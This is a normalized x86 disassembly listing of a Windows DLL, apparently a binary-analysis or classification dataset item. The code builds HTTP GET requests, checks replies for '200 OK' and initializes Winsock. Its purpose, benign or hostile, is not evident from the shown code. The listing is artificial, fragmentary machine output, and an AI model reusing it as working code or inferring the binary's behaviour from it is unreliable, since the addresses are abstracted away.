mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_100040b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c7c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor bl bl
mov esi ecx
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x18 ] 0xa0d0a0d
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x20 ] 0x20303032
mov [ ebp - 0x1c ] 0x4b4f
mov [ ebp - 0x1a ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
mov [ ebp - 0x60 ] eax
lea eax [ ebp - 0x18 ]
push eax
add esi 0x38
push esi
call sub_10004780
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
push esi
mov ecx edi
xor ebx ebx
lea eax [ ebp - 0x58 ]
call sub_10004750
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] ebx
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp - 0x58 ]
push edx
call sub_10004780
cmp eax 0x9
je r-xdata
mov ecx [ ebp - 0x5c ]
mov edx [ ecx + 0x18 ]
mov ebx [ ebp - 0x60 ]
lea ebx [ ebx + edi ]
push esi
or ecx 0xffffffff
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] edx
mov [ ebp - 0x70 ] 0xc8
call sub_10004750
mov esi 0x10
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x28 ] esi
jb r-xdata
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
lea edx [ ebp - 0x3c ]
mov [ ebp - 0x6c ] edx
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x6c ] ecx
jmp r-xdata
mov eax [ ebp - 0x58 ]
push eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x28 ] 0xf
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x3c ] al
cmp [ ebp - 0x44 ] esi
jb r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_10012c4b
add esp 0x4
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x5c ]
mov ecx [ ecx + 0x10 ]
mov [ ebp - 0x68 ] eax
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
lea eax [ ebp - 0x70 ]
push eax
call edx
cmp [ ebp - 0x28 ] esi
jb r-xdata
call sub_10012c4b
add esp 0x4
mov ecx [ ebp - 0x58 ]
push ecx
sub_10004220
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push edi
call edx
test eax eax
je r-xdata
xor edi edi
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edi eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
jmp [ eax * 4 + jump_table_100042bc ]
mov eax [ ebp + 0x8 ]
cmp eax 0x4
ja r-xdata
cmp [ esi + 0x14 ] 0x0
jne r-xdata
push esi
mov ecx edi
call sub_100043d0
pop edi
pop esi
pop ebp
retn 0x8
push esi
mov ecx edi
call sub_100043d0
mov ecx esi
call sub_100040b0
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push esi
call eax
mov edx [ edi ]
mov eax [ edx + 0x1c ]
mov ecx edi
call eax
test eax eax
je r-xdata
cmp [ esi + 0x30 ] 0x10
mov ecx [ esi + 0x2c ]
lea eax [ esi + 0x1c ]
jb r-xdata
mov edx [ edi ]
push ecx
push eax
mov eax [ edx + 0x24 ]
mov ecx edi
call eax
pop edi
mov [ esi + 0x14 ] 0x1
pop esi
pop ebp
retn 0x8
mov eax [ eax ]
sub_100042d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cf40
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push esi
call sub_10001220
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov eax 0xf
mov [ esi + 0x30 ] eax
mov [ esi + 0x2c ] ebx
mov [ esi + 0x1c ] bl
mov [ esi + 0x4c ] eax
mov [ esi + 0x48 ] ebx
mov [ esi + 0x38 ] bl
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0xc ] ecx
mov edx [ edi ]
mov eax [ edx + 0x14 ]
mov ecx edi
call eax
mov ecx [ ebp + 0x14 ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ebx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
test edx edx
jne r-xdata
mov eax [ ecx ]
mov [ ebp + 0xc ] eax
mov [ ebp + 0xc ] ebx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ ecx ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push ebx
call eax
mov ecx [ ebp + 0xc ]
mov edx [ edi + 0xc ]
push eax
push ecx
mov ecx [ esi + 0x8 ]
call edx
mov ecx esi
call sub_10004550
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_100043a0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10004690
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100043d0
push ebp
mov ebp esp
mov eax 0x1000c
call sub_1001a280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov edx [ esi ]
mov [ ebp - 0x1000c ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0x10008 ] esi
call eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
push ebx
push edi
lea ebx [ ebx ]
pop edi
pop ebx
mov edi [ ebp - 0x1000c ]
mov ecx [ edi + 0x4c ]
add edi 0x38
cmp ecx 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax [ edi + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ebx
jbe r-xdata
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x10004 ]
cmp edx eax
jb r-xdata
push r--data
call sub_100126ab
test ebx ebx
je r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
lea esi [ eax + ebx ]
cmp esi 0xfffffffe
ja r-xdata
cmp ecx 0x10
jb r-xdata
mov edx [ edi + 0x10 ]
add edx eax
lea eax [ ebp - 0x10004 ]
cmp edx eax
jbe r-xdata
mov edx [ esi ]
mov edx [ edx + 0x20 ]
push 0x10000
lea eax [ ebp - 0x10004 ]
push eax
mov ecx esi
call edx
mov ebx eax
test ebx ebx
je r-xdata
cmp ecx esi
jae r-xdata
mov eax edi
lea ecx [ ebp - 0x10004 ]
sub ecx eax
push ecx
push edi
mov eax ebx
call sub_10002bb0
jmp r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x10004 ]
sub ecx eax
push ecx
push edi
mov eax ebx
call sub_10002bb0
jmp r-xdata
test esi esi
jne r-xdata
push eax
push esi
push edi
call sub_10002ca0
test esi esi
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x10 ] esi
cmp ecx 0x10
jb r-xdata
mov esi [ ebp - 0x10008 ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi ] 0x0
jmp r-xdata
mov edi [ edi ]
mov [ edi + esi ] 0x0
mov edi [ edi ]
mov edx [ edi + 0x10 ]
push ebx
lea ecx [ ebp - 0x10004 ]
push ecx
add edx eax
push edx
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10004550
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
call edx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
mov edi eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x20544547
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x28 ] 0x54544820
mov [ ebp - 0x24 ] 0x2e312f50
mov [ ebp - 0x20 ] 0xa0d30
mov [ ebp - 0x1c ] 0x74736f48
mov [ ebp - 0x18 ] 0x203a
mov [ ebp - 0x16 ] 0x0
mov [ ebp - 0xc ] 0xa0d0a0d
mov [ ebp - 0x8 ] 0x0
lea ecx [ eax + 0x1 ]
nop
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
add esi 0x1c
push eax
lea eax [ ebp - 0x14 ]
mov ecx esi
call sub_10002a60
mov eax edi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax edi
mov ecx esi
call sub_10002a60
lea eax [ ebp - 0x28 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x28 ]
mov ecx esi
call sub_10002a60
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1c ]
mov ecx esi
call sub_10002a60
mov edx [ ebp - 0x2c ]
mov eax edx
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
mov eax edx
mov ecx esi
call sub_10002a60
lea eax [ ebp - 0xc ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc ]
mov ecx esi
call sub_10002a60
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10012771
mov esp ebp
pop ebp
retn
sub_10004690
push ebp
mov ebp esp
push 0xffffffff
push sub_1001caa8
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi + 0x18 ]
xor ebx ebx
cmp ecx ebx
je r-xdata
cmp [ esi + 0x4c ] 0x10
jb r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x4c ] 0xf
mov [ esi + 0x48 ] ebx
mov [ esi + 0x38 ] bl
cmp [ esi + 0x30 ] 0x10
jb r-xdata
mov eax [ esi + 0x38 ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi + 0x30 ] 0xf
mov [ esi + 0x2c ] ebx
mov [ esi + 0x1c ] bl
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10001140
sub_10004750
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] 0xf
mov [ ebp - 0x4 ] eax
mov [ edi ] al
mov eax [ ebp + 0x8 ]
push eax
call sub_10004820
mov eax edi
pop edi
mov esp ebp
pop ebp
retn 0x4
sub_10004780
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
pop ebp
retn 0xc
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0xc
cmp eax edi
ja r-xdata
mov ecx 0x1
sub ecx eax
add edi ecx
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov edx [ ebp + 0xc ]
movsx eax [ edx ]
push edi
push eax
push ebx
call sub_10012d80
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov ebx [ ebx ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx esi
call sub_10004030
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0xc ]
movsx edx [ ecx ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push edx
lea ebx [ esi + 0x1 ]
push ebx
call sub_10012d80
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_10004820
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
cmp eax ebx
jae r-xdata
sub eax ebx
push esi
mov esi eax
cmp ecx esi
jae r-xdata
push r--data
call sub_100126f8
cmp edi edx
jne r-xdata
mov esi ecx
mov eax edi
call sub_10002c50
test al al
je r-xdata
lea ecx [ esi + ebx ]
or eax 0xffffffff
mov esi edi
call sub_10002b40
mov eax ebx
xor ecx ecx
call sub_10002b40
mov eax edi
pop esi
pop ebp
retn 0x4
mov eax edi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov [ eax + esi ] 0x0
mov eax [ edi ]
mov [ eax + esi ] 0x0
mov eax edi
pop esi
pop ebp
retn 0x4
push esi
add ecx ebx
push ecx
push eax
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] esi
jb r-xdata
sub_100048d0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10004900
push ebp
mov ebp esp
cmp [ ecx + 0x20 ] 0x0
mov eax r--data
jne r-xdata
push esi
push edi
mov edx eax
lea esi [ edx + 0x1 ]
push ebx
jmp r-xdata
mov eax r--data
mov bl [ edx ]
inc edx
test bl bl
jne r-xdata
sub edx esi
lea esi [ ecx + 0x4 ]
push edx
mov ecx esi
call sub_10002a60
mov eax [ ebp + 0x8 ]
mov ecx eax
lea edi [ ecx + 0x1 ]
pop ebx
lea ecx [ ecx ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
mov ecx esi
call sub_10002a60
push 0x1
mov eax r--data
mov ecx esi
call sub_10002a60
mov eax [ ebp + 0xc ]
mov ecx eax
lea edi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
mov ecx esi
call sub_10002a60
pop edi
pop esi
pop ebp
retn 0x8
sub_10004990
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ca5e
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov ecx 0xf
mov [ esi + 0x18 ] ecx
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
lea edi [ esi + 0x24 ]
mov [ edi + 0x14 ] ecx
mov [ edi + 0x10 ] eax
mov [ edi ] al
lea eax [ ebp + 0x8 ]
push eax
or ecx 0xffffffff
xor ebx ebx
mov [ ebp - 0x4 ] 0x4
call sub_10004820
mov cx [ ebp + 0x24 ]
lea edx [ ebp + 0x28 ]
mov [ esi + 0x40 ] cx
push edx
or ecx 0xffffffff
lea edi [ esi + 0x4 ]
call sub_10004820
mov eax [ ebp + 0x44 ]
mov edi 0x10
mov [ esi + 0x20 ] eax
cmp [ ebp + 0x1c ] edi
jb r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] eax
mov [ ebp + 0x8 ] al
cmp [ ebp + 0x3c ] edi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x40
mov edx [ ebp + 0x28 ]
push edx
call sub_10012c4b
add esp 0x4
sub_10004a60
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cf03
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x44
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x20 ]
push eax
sub esp 0x1c
mov edi esp
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] 0xf
mov [ edi ] cl
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x14 ] esp
push ecx
or ecx 0xffffffff
xor ebx ebx
call sub_10004820
mov [ ebp - 0x4 ] 0x1
movzx edx [ esi + 0x40 ]
push edx
sub esp 0x1c
mov edi esp
mov [ ebp - 0x18 ] esp
add esi 0x24
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
push esi
or ecx 0xffffffff
mov [ edi ] bl
call sub_10004820
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] bl
call sub_10004990
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10004b40
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x38 ] 0x10
jb r-xdata
push ebx
xor ebx ebx
mov [ esi + 0x38 ] 0xf
mov [ esi + 0x34 ] ebx
mov [ esi + 0x24 ] bl
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_10012c4b
add esp 0x4
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
mov [ esi ] r--data
pop ebx
je r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10004bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ced3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x44
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor edi edi
push edx
sub esp 0x1c
mov ecx esp
mov eax edi
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ebp - 0x14 ] esp
mov [ ecx ] dl
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
cmp eax [ esi + 0xc ]
jne r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ ebp + 0xc ]
cmp ecx edx
ja r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
mov esi eax
mov eax edi
call sub_10004db0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0xc ]
push eax
call sub_10012e43
add esp 0x4
push eax
sub esp 0x1c
mov ecx esp
mov eax ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp + 0xc ] esp
mov [ ecx ] 0x0
lea esi [ eax + 0x1 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
call sub_100053c0
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0xc ]
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
mov esi eax
mov eax ebx
call sub_10004db0
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10004990
mov edi eax
jmp r-xdata
add [ esi + 0x8 ] 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ eax ] edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
call sub_100053c0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x8 ]
lea ecx [ ebp + 0xc ]
mov [ ebp + 0xc ] edi
cmp ecx eax
jae r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_10004cf0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bf03
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x1
mov esi [ edi + 0x4 ]
mov ebx [ edi + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
xor eax eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10012c4b
add esp 0x4
add esi 0x4
cmp esi ebx
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
sub_10004d80
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10004cf0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10004db0
push ebx
mov ebx eax
push edi
mov edi ecx
test ebx ebx
je r-xdata
cmp esi 0xfffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ edi + 0x14 ]
cmp eax esi
jae r-xdata
push r--data
call sub_100126ab
mov eax edi
mov eax [ edi ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x10 ]
push eax
push esi
push edi
call sub_10002ca0
test esi esi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x10 ] esi
cmp eax 0x10
jb r-xdata
mov eax edi
pop edi
pop ebx
retn
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
pop edi
mov [ eax ] 0x0
pop ebx
retn
mov eax [ edi ]
mov [ eax ] 0x0
mov eax edi
pop edi
pop ebx
retn
cmp ecx 0x10
jb r-xdata
mov edx [ edi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax edi
mov [ eax + esi ] 0x0
mov eax [ edi ]
mov [ eax + esi ] 0x0
mov eax edi
pop edi
pop ebx
retn
push esi
push ebx
push eax
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] esi
jb r-xdata
mov eax edi
sub ebx eax
push edi
mov ecx esi
call sub_10004820
pop edi
pop ebx
retn
mov eax [ edi ]
sub ebx eax
push edi
mov ecx esi
call sub_10004820
pop edi
pop ebx
retn
sub_10004e90
push ebp
mov ebp esp
mov eax [ esi + 0x4 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea edx [ ebp + 0x8 ]
cmp ecx edx
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_100053c0
push edi
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x4
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_100053c0
pop edi
add [ esi + 0x4 ] 0x4
pop ebp
retn 0x4
mov ecx [ esi ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
sub_10004f00
push ebp
mov ebp esp
push esi
push edi
mov edi [ eax + 0x4 ]
mov esi [ edi ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push ebx
call eax
cmp [ esi + 0x11 ] 0x0
jne r-xdata
pop ebx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
cmp esi [ eax + 0x8 ]
jne r-xdata
jmp r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
sub_10004f70
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10014900
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push 0x8007
call [ SetErrorMode@IAT ]
mov esi [ ebp + 0x8 ]
mov edi [ PostQueuedCompletionStatus@IAT ]
mov ebx [ Sleep@IAT ]
xor eax eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x0
push esi
call edi
push 0x7530
call ebx
jmp r-xdata
sub_10005010
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c567
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
mov [ ebp - 0x1b8 ] edi
mov [ edi ] r--data
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov [ edi ] r--data
mov [ edi + 0x14 ] ebx
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
lea eax [ ebp - 0x1a0 ]
push eax
mov bl 0x1
push 0x202
mov [ ebp - 0x4 ] bl
call [ WSAStartup@IAT ]
push 0x10
mov [ edi + 0x10 ] esi
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x1a8 ] esi
mov [ ebp - 0x4 ] 0x2
test esi esi
je r-xdata
mov eax [ esi ]
